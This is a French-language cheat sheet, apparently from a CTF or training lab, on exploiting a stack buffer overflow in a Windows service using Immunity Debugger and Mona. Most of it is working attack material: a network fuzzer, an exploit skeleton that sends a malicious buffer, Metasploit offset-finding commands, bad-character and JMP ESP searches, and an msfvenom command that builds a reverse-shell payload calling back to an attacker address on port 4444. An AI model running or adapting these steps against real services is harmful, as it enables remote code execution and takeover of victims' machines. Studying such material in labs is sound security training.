# Exploitation Buffer Overflow avec Immunity Debugger et Mona

## Redirection de Port avec netsh

```bash
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=3333 connectaddress=127.0.0.1 connectport=4444 protocol=tcp
```

## Configuration de Mona dans Immunity Debugger

```bash
!mona config -set workingfolder c:\mona\%p
# %p = nom du fichier sans extension
```

## Fuzzing pour Déterminer la Taille du Buffer

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.220.0"
port = 9999
timeout = 5
prefix = "OVER "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing avec {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashé à {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

## Script d'Exploitation Initial

```python
import socket

ip = "10.10.220.0"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Envoi du buffer malveillant...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Fait !")
except:
  print("Connexion impossible.")
```

## Création d'un Pattern de Débordement

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
```

## Récupération de l'EIP après crash

```bash
/usr/bin/msf-pattern_offset -l 600 -q 35724134
```

## Recherche des Bad Characters

Dans Immunity Debugger :
```bash
!mona bytearray -b "\x00"
```

Génération d'une liste complète de badchars :
```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Comparaison avec Mona après exécution :
```bash
!mona compare -f C:\mona\brainpan\bytearray.bin -a <ESP_ADDRESS>
```

Possibles badchars additionnels : `\x0a\x0d`

## Trouver une Adresse de Jump ESP

```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

Adresse obtenue (exemple) : `\xaf\x11\x50\x62` (à inverser pour l'utiliser dans l'exploit).

## Génération du Shellcode

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.73.224 LPORT=4444 EXITFUNC=thread -b "\x00" -f py
```

## Ajout de NOPs (No Operation)

```python
nop_sled = "\x90" * 10
```

## Exploitation Finale

Injection dans le script d'exploit avec buffer structuré.
